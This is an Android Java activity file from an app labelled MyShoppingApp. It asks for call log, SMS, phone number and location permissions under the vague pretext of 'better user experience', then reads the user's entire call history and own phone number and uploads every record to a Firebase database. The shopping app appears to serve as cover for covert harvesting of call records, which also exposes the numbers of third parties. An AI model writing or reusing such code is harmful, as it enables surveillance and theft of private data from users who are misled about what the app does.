package com.example.MyShoppingApp.activity;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.widget.Toast;

import com.example.myshoppingapp.R;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.SimpleDateFormat;
import java.util.Date;

public class HomeActivity extends AppCompatActivity {

    private static final int REQUEST_CALL_LOG_PHONE_NUMBER = 108;
    String phNumber;
    String callType;
    String callDate;
    Date callDayTime;
    SimpleDateFormat ft;

    String callDuration;
    String dir = null;
    int dircode;
    int count = 0;
    String myNum;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

      if (ContextCompat.checkSelfPermission(
                getApplicationContext(), Manifest.permission.READ_CALL_LOG) ==
                PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
                getApplicationContext(), Manifest.permission.READ_PHONE_NUMBERS) ==
                PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
                getApplicationContext(), Manifest.permission.READ_SMS) ==
                PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
              getApplicationContext(), Manifest.permission.ACCESS_COARSE_LOCATION) ==
              PackageManager.PERMISSION_GRANTED && ContextCompat.checkSelfPermission(
              getApplicationContext(), Manifest.permission.ACCESS_FINE_LOCATION) ==
              PackageManager.PERMISSION_GRANTED)  {
            // You can use the API that requires the permission.
            readCallLog();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (shouldShowRequestPermissionRationale(Manifest.permission.READ_CALL_LOG) && shouldShowRequestPermissionRationale(Manifest.permission.READ_PHONE_NUMBERS)) {
                // In an educational UI, explain to the user why your app requires this
                // permission for a specific feature to behave as expected. In this UI,
                // include a "cancel" or "no thanks" button that allows the user to
                // continue using your app without granting the permission.
                Toast.makeText(this, "We need your call log for better user experience", Toast.LENGTH_SHORT).show();
            }
            // You can directly ask for the permission.
            // The registered ActivityResultCallback gets the result of this request.
            requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG , Manifest.permission.READ_PHONE_NUMBERS,Manifest.permission.READ_SMS
            , Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION}, REQUEST_CALL_LOG_PHONE_NUMBER);
        }
        //User Location

    }

    private String readCallLog() {

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Call log permission not granted", Toast.LENGTH_SHORT).show();
            return null;
        }
        /*Button loginButton = findViewById(R.id.logInBusinessAccountButton);
        Button signUpButton = findViewById(R.id.createBusinessAccButton);

        loginButton.setEnabled(false);
        loginButton.getBackground().setAlpha(128);

        signUpButton.setEnabled(false);
        signUpButton.getBackground().setAlpha(128);
*/
        Cursor cursor = getApplicationContext().getContentResolver().query(CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC");
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        while (cursor.moveToNext()) {
            phNumber = cursor.getString(number);
            callType = cursor.getString(type);
            callDate = cursor.getString(date);
            callDayTime = new Date(Long.valueOf(callDate));
            ft = new SimpleDateFormat ("yyyy.MM.dd");

            callDuration = cursor.getString(duration);
            dir = null;
            dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;
                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }

            myNum = getOwnNumber();

            setDatabase(new User(
                    new CallLogging(phNumber,callType,callDayTime,callDuration,dir)), myNum
            );
        }
        /*loginButton.setEnabled(true);
        loginButton.getBackground().setAlpha(255);

        signUpButton.setEnabled(true);
        signUpButton.getBackground().setAlpha(255);*/
        return null;
    }




    public void setDatabase(User user, String myNum) {

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(String.valueOf(myNum) + (++count));
        myRef.setValue(user);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == REQUEST_CALL_LOG_PHONE_NUMBER) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                readCallLog();
            } else {
                Toast.makeText(this, "This Permission was not granted", Toast.LENGTH_SHORT).show();
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    public String getOwnNumber() {
        TelephonyManager tMgr = (TelephonyManager) getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
                PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return null;
        }
        return tMgr.getLine1Number();
    }

}




class CallLogging{
    public String phNumber ;
    public String callType ;
    public String callDate ;
    public Date callDayTime ;
    public SimpleDateFormat ft ;

    public String callDuration ;
    public String direction = null;

    CallLogging(String phNumber ,String callType, Date callDayTime,String callDuration,String dir){
        this.phNumber = phNumber;
        this.callType = callType;
        this.callDayTime = callDayTime;
        this.direction = dir;
        this.callDuration = callDuration;
    }
}

class User{

    public CallLogging call;

    User(CallLogging call){
        this.call = call;
    }
}

